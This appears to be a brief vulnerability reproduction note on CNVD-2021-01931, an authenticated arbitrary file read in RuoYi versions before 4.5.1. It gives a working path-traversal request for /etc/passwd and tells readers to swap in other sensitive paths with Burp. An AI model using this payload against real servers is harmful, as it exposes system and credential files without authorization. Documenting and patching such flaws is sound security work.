# Read any file in the background according to the management system CNVD-2021-01931

## Vulnerability Description

If the management system is based on SpringBoot's permission management system, you can read any file on the server after logging in to the background.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">RuoYi < v4.5.1</span>

## Network surveying and mapping



## Vulnerability reappears

Log in to the background to access Url

```shell
/common/download/resource?resource=/profile/../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ruoyi-1.png)



The file will be downloaded after accessing `/etc/passwd`



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ruoyi-2.png)



You can use Burp to grab packets to change `/etc/passwd` to obtain sensitive information for other file paths

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ruoyi-4.png)



![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ruoyi-5.png)



Added filtering in new version fix

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/ruoyi-7.png)